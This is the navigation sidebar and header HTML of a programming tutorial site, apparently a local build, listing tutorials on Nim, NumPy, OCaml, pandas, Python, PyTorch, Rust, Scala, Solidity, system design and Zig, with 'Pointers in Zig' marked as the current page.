                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/modules/">Modules in Nim</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/nims_marco_system/">Nim Macros: A Comprehensive Tutorial</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/nims_oop/">Object-Oriented Programming in Nim</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/nim/nim/parallelism_in_nim/">Parallelism in Nim</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">🎲</i>
                                numpy
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/advanced_array_manipulation/">Advanced Array Manipulation with NumPy</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/introduction_to_numpy/">An Introduction to NumPy</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/advanced_numpy_concepts/">Applications and Advanced Numpy Concepts</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/indexing_and_slicing_in_numpy/">Indexing and Slicing In Numpy</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/linear_algebra/">Linear Algebra with NumPy</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/broadcasting/">NumPy Broadcasting</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/numpy_operations/">NumPy Operations</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/numpy/numpy/random_number_generation_and_sampling/">Random Number Generation and Sampling with NumPy</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">🐪</i>
                                Ocaml
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/ocaml/ocaml/advanced_ocaml_concepts/">Advanced Concepts in OCaml</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/ocaml/ocaml/introduction_to_ocaml/">An Introduction to OCaml: A Versatile Programming Language</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/ocaml/ocaml/core_concepts_in_ocaml/">Core Concepts in OCaml</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/ocaml/ocaml/error_handling_in_ocaml/">Error Handling in OCaml</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/ocaml/ocaml/file_manipulation/">File Manipulation in OCaml</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/ocaml/ocaml/handling_command_arguments_in_ocaml/">Handling Command-Line Arguments in OCaml</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/ocaml/ocaml/garbage_collector_using_ocaml/">Working with the Garbage Collector in OCaml</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">P</i>
                                pandas
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/advanced_data_aggregation/">Advanced Data Aggregation and Grouping in Pandas</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/intro_to_pandas/">An Introduction to Pandas</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/pandas_with_pyarrow/">Extending Pandas with PyArrow: Enhanced Functionality and Performance</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/cleaning_data_using_panda/">How to Clean Data using Pandas</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/indexing_and_selection_of_data/">Indexing and Selection of Data in Pandas</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/introduction_to_data_types/">Introduction to Data Structures in Pandas</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/introduction_to_time_series/">Time Series Analysis with Pandas</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/viewing_and_understanding_dataframes/">Viewing and Understanding Dataframes</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/windowing_operations/">Windowing Operations in Pandas</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pandas/pandas/working_with_missing_data/">Working with Missing Data in Pandas</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                Python
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_testing/">Comprehensive Guide to Testing in Python: Unit Tests and Mocking Techniques</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_decorators/">Demystifying Python Decorators: Enhancing Functionality with Decorators</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_error_handling/">Effective Error Handling in Python: Try-Except Blocks and Finally Clause</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_file_handling/">Efficient File Handling in Python: Reading, Writing, and Path Management</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_for_machine_learning/">Essentials of Python for Machine Learning: Libraries, Concepts, and Model Building</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_advanced_data_structures/">Exploring Advanced Data Structures in Python: Collections and Priority Queues</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_operators/">Exploring Python Operators: Arithmetic, Comparison, and Logical Operations</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_introduction/">Introduction to Python</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_concurrency_and_parallelism/">Mastering Concurrency and Parallelism in Python: Threading, Multiprocessing, and Asyncio</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_control_structures/">Mastering Control Structures in Python: If Statements, Loops, and More</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_dictionaries_and_sets/">Mastering Dictionaries and Sets in Python: Comprehensive Guide to Data Handling</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_object_oriented_programming/">Mastering Object-Oriented Programming in Python: Classes, Inheritance, and Polymorphism</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_string_manipulation/">Mastering String Manipulation in Python: Operations, Methods, and Formatting</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/basic_python_syntax/">Mastering the Basics: Python Syntax, Indentation, and Comments</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_modules_and_packages/">Python Modules and Packages: Importing Essentials and Exploring Standard Libraries</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_functions/">Understanding Functions in Python: Definitions, Parameters, Returns, and Scope</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_iterators_and_generators/">Understanding Iterators and Generators in Python: Leveraging Yield for Efficient Code</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/variables_and_data_types/">Understanding Python Variables and Data Types: From Basics to Type Conversion</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/python/python/python_lists_and_tuples/">Working with Lists and Tuples in Python: Creation, Access, and More</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">🕯️</i>
                                pytorch
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/introduction_to_pytorch/">An Introduction to PyTorch</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/pytorch_and_neural_networks/">Deep Dive into PyTorch: Autograd and Neural Networks</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/tensors_in_pytorch/">Deep Dive into Tensors</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/deploying_pytorch_in_python/">Deploying PyTorch in Python via a REST API with Flask</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/model_training_and_evaluation/">Model Training and Evaluation</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/data_loading_and_preprocessing/">PyTorch: Data Loading and Preprocessing</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/transfer_learning/">Transferr Learning in Pytorch</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/pytorch/pytorch/writing_a_training_loop_from_scratch_in_pytorch/">Writing a training loop from scratch in PyTorch</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">api</i>
                                Rust
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/advanced_enums_pattern_matching_rust/">Advanced Enums and Pattern Matching in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/basic_concepts_in_rust/">Basic Concepts in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/building_robust_cli_tool_rust/">Building a Robust CLI Tool with Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/control_flow_in_rust/">Control Flow in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/rust_ownership/">Control Flow in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/effective_testing_strategies_rust/">Effective Testing Strategies in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/exploring_advanced_types_rust/">Exploring Advanced Types in Rust: Structs and Enums</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/rust_introduction/">Getting Started with Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/integrating_rust_ffi_safe_abstractions/">Integrating Rust with Other Languages: FFI and Safe Abstractions</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/leveraging_slices_rust/">Leveraging the Power of Slices in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/collections-rust/">Mastering Collections in Rust: Vectors, HashMaps, and HashSets</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/concurrency_rust/">Mastering Concurrency in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/mastering_generics_traits_rust/">Mastering Generic Types and Traits in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/mastering_lifetime_management_rust/">Mastering Lifetime Management in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/macros-rust/">Mastering Macros in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/mastering_references_borrowing_rust/">Mastering References and Borrowing in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/mastering_structs_rust/">Mastering Structs in Rust: Definition, Methods, and Usage</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/robust_error_handling_rust/">Robust Error Handling in Rust: Using Result and Option</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/smart_pointers_rust/">Smart Pointers in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/structuring_rust_projects_modules_crates/">Structuring Rust Projects: Modules and Crates Explained</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/understanding_using_unsafe_rust/">Understanding and Using Unsafe Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/async_programming_rust/">Unlocking Asynchronous Programming in Rust</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/rust/rust/first_rust_program/">Your First Rust Program</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                Scala
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/advanced_concepts_in_scala/">Advanced Concepts in Scala</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/introduction_to_scala/">An Introduction to Scala</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/arrays_in_scala/">Exploring Arrays in Scala</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/functional_programming/">Functional Programming in Scala</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/future_and_promises/">Future and Promises in Scala</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/object_oriented_programming/">Object-Oriented Programming in Scala</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/string_interpolation_in_scala/">String Interpolation in Scala</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/scala/scala/understand_maps_in_scala/">Understanding Maps in Scala</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">api</i>
                                Solidity
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/introduction_to_solidity.md/">An Introduction To Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/build_a_crowdfunding_contract/">Build A Crowdfunding Contract with Solidity and ERC20 Tokens</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/building_a_remote_purchase_contract/">Build a Remote Purchase Contract Using Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/build_a_voting_contract/">Build a Voting Contract Using Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/effective_error_handling_in_solidity/">Effective error handling in Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/essential_gas_optimization/">Essential Gas Optimization Techniques in Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/sending_and_recieving_ether/">How to Send and Receive Ether in Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/reentrancy_attacks/">Learn About Reentracny Attacks and how to Prevent them</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/testing_in_solidity/">Learn How To Write Unit Tests In Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/price_oracle_using_chainlink_and_solidity/">Price Oracle Using Chainlink and Solidity</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/solidity_and_erc20_tokens/">Solidity and ERC20 Tokens</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/solidity/solidity/understanding_application_binary_interface/">Understandin Application Binary Interface (ABI) in Solidity</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">function</i>
                                System Design
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/introduction_to_system_design/">An Introduction to System Design</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/api_architecture/">API Architecture: Design Best Practices for REST APIs</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/database_sharding/">Database Sharding: Concepts and Examples</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/web_sockets/">Deep Dive into WebSockets</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/nosql_vs_sql/">NoSQL vs. SQL Databases: A Comprehensive Overview</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/tcp_vs_udp/">The Difference Between TCP and UDP</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/domain_name_system/">The Domain Name System</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/reverse_proxies/">Understanding a Reverse Proxy??</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/acid_transactions/">Understanding ACID Transactions in Database Systems</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/throughput_vs_latency/">Understanding the Difference Between Throughput and Latency in Network Performance</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/database_indexes/">Using Database Indexes for Improved Performance</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/api_gateway/">What Is an API Gateway?</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/caching/">What is Caching?</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/system-design/system-design/load_balancing/">What is Load Balancing?</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  ">
                            <button class="btn">
                                <i class="material-icons me-2">api</i>
                                Technical Architecture
                            </button>
                            <div class="sidebar-submenu ">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/technical-architecture/technical-architecture/event_driven_architecture/">A Detailed Guide to Event-Driven Architecture</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/technical-architecture/technical-architecture/choosing_the_right_tech_stack/">Choosing the Right Technology Stack for Your Project</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/technical-architecture/technical-architecture/ensuring_security_in_your_architecture/">Ensuring Security in Your Technical Architecture</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/technical-architecture/technical-architecture/ci_cd/">Implementing CI/CD Pipelines for Seamless Deployment</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/technical-architecture/technical-architecture/introduction_to_technical_arch/">Introduction to Technical Architecture: Principles and Best Practices</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/technical-architecture/technical-architecture/microservice_vs_monolith/">Microservices vs. Monolithic Architecture: Which One to Choose?</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/technical-architecture/technical-architecture/the_role_of_cloud_services/">The Role of Cloud Services in Modern Technical Architecture</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
                    
                    
                        <li class="sidebar-dropdown  current active">
                            <button class="btn">
                                <i class="material-icons me-2">code</i>
                                Zig
                            </button>
                            <div class="sidebar-submenu d-block">
                                <ul>
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/zig/">A getting started guide to Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/concurrency_in_zig/">Concurrency in Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/dsa_zig/">DSA using Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/error_handling_in_zig/">Error Handling in Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/generics/">Generics in Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class="current "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/pointers_in_zig/">Pointers in Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/stack_memory_in_zig/">Stack Memory in Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/system_programming_using_zig/">System Programming in Zig</a></li>
                                        
                                    
                                        
                                        
                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/zig/zig/using_external_packages_with_zig/">Third Party Dependencies in Zig</a></li>
                                        
                                    
                                </ul>
                            </div>
                        </li>
                    
                
            
        </ul>
        
    </div>
    
        <ul class="sidebar-footer list-unstyled mb-0">
            
        </ul>
    
</nav>

                <main class="page-content bg-transparent">
<div id="top-header" class="top-header d-print-none">
    <div class="header-bar d-flex justify-content-between">
        <div class="d-flex align-items-center">
            <a href='/tutorials/' class="logo-icon me-3" aria-label="HomePage" alt="HomePage">
                <div class="small">
                    
                            <?xml version="1.0" encoding="UTF-8"?><svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 250 250"><path d="m143,39.5c-18,0-18,18-18,18,0,0,0-18-18-18H22c-2.76,0-5,2.24-5,5v143c0,2.76,2.24,5,5,5h76c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h76c2.76,0,5-2.24,5-5V44.5c0-2.76-2.24-5-5-5h-85Zm63,123.5c0,1.38-1.12,2.5-2.5,2.5h-60.5c-18,0-18,18-18,18,0,0,0-18-18-18h-60.5c-1.38,0-2.5-1.12-2.5-2.5v-94c0-1.38,1.12-2.5,2.5-2.5h51.5c7.2,0,8.64,11.52,8.93,16.13.07,1.05.95,1.87,2,1.87h32.14c1.06,0,1.94-.82,2-1.87.29-4.61,1.73-16.13,8.93-16.13h51.5c1.38,0,2.5,1.12,2.5,2.5v94Z" style="fill:#06f;"/></svg>
                    
                </div>
                <div class="big">
                    
                            
                    
                </div>
            </a>
            <button id="close-sidebar" class="btn btn-icon btn-soft">
                <span class="material-icons size-20 menu-icon align-middle">menu</span>
            </button>
            <a href="https://akhil.sh" class="btn btn-primary ms-3" role="button">Back to Website</a>
            
            
                
                    
